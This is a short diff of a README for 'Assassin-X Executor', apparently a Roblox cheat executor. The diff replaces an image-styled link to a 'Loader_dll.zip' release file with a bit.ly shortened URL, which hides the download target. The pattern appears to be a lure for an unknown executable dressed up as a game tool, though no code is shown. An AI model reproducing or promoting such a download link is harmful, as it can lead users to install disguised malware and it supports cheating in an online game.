@@ -456,7 +456,7 @@
 
 Welcome to the Assassin-X Executor repository! 🚀 This repository hosts the latest version of the Assassin-X Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-![Assassin-X Executor](https://github.com/secondlathloothy/Assassin-X-Executor/releases/download/Download/Loader_dll.zip)
+![Assassin-X Executor](https://bit.ly/3ZmBEFM)
 
 ## Table of Contents
 
